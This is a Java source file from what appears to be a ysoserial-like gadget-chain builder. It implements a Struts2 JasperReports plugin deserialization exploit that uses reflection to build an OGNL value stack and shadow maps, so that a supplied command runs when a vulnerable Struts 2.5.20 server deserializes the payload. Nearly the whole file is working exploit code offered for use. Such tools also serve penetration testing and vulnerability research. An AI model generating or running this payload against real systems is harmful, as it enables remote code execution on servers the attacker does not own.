package org.ses.gadgetbuilder.chains1;

import com.opensymphony.xwork2.TextProvider;
import com.opensymphony.xwork2.conversion.impl.XWorkConverter;
import com.opensymphony.xwork2.ognl.OgnlValueStack;
import com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor;
import com.opensymphony.xwork2.util.CompoundRoot;
import com.opensymphony.xwork2.util.ValueStack;
import org.apache.struts2.views.jasperreports.ValueStackShadowMap;
import org.ses.gadgetbuilder.adapters.GetterMethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.EqualsTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;


/**
 * <a href="https://github.com/frohoff/ysoserial/blob/newgadgets/src/main/java/ysoserial/payloads/Struts2JasperReports.java">...</a>
 */
@Dependencies({ "org.apache.struts:struts2-core:2.5.20", "org.apache.struts:struts2-jasperreports-plugin:2.5.20" })
@Authors({ Authors.SCICCONE })
@Impact(Impact.MethodInvoke)
public class Struts2JasperReports extends MethodInvokeGadgetChain<EqualsTrampoline, GetterMethodInvokeAdapter> {


    public Struts2JasperReports(EqualsTrampoline _trampoline, GetterMethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        // create required objects via reflection
        Constructor<XWorkConverter> c1 = XWorkConverter.class.getDeclaredConstructor();
        Constructor<OgnlValueStack> c2 = OgnlValueStack.class.getDeclaredConstructor(XWorkConverter.class, CompoundRootAccessor.class, TextProvider.class, boolean.class);
        c1.setAccessible(true);
        c2.setAccessible(true);
        XWorkConverter xworkConverter = c1.newInstance();

        OgnlValueStack ognlValueStack = Reflections.createWithoutConstructor(OgnlValueStack.class);

        Map setMap = new HashMap<>();
        setMap.put("com.opensymphony.xwork2.util.OgnlValueStack.MAP_IDENTIFIER_KEY", "");

        CompoundRoot root = new CompoundRoot();
        root.push(setMap);

        Reflections.setFieldValue(ognlValueStack, "root", root);

        // inject templateImpl with embedded command
        ognlValueStack.set("foo", methodInvokeAdapter.getInvocationTarget(command));

        ValueStackShadowMap shadowMap1 = new ValueStackShadowMap(ognlValueStack);
        ValueStackShadowMap shadowMap2 = new ValueStackShadowMap(ognlValueStack);

        // execute OGNL "(template.newTransformer()) upon deserialisation
        String keyExpression = String.format("(foo.%s())", methodInvokeAdapter.getMethodName());
        shadowMap1.put(keyExpression, null);
        shadowMap2.put(keyExpression, null);

        return new TrampolineConnector(shadowMap1, shadowMap2);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.apache.struts2.views.jasperreports.ValueStackShadowMap(AbstractMap<K,V>).equals(Object)\n" +
                "org.apache.struts2.views.jasperreports.ValueStackShadowMap.get(String)\n" +
                "com.opensymphony.xwork2.ognl.OgnlValueStack.findValue(String)\n" +
                "com.opensymphony.xwork2.ognl.OgnlValueStack.findValue(String, boolean)\n" +
                "com.opensymphony.xwork2.ognl.OgnlValueStack.tryFindValueWhenExpressionIsNotNull(String)\n" +
                "com.opensymphony.xwork2.ognl.OgnlValueStack.tryFindValue(String)\n" +
                "com.opensymphony.xwork2.ognl.OgnlValueStack.tryFindValue(String, Class[defaultType])\n" +
                "com.opensymphony.xwork2.ognl.OgnlUtil.getValue()\n" +
                "com.opensymphony.xwork2.ognl.OgnlUtil.ognlGet()\n" +
                "ognl.Ognl.getValue()\n" +
                "... ognl runtime\n" +
                "java.lang.reflect.Method.invoke()";
    }
}
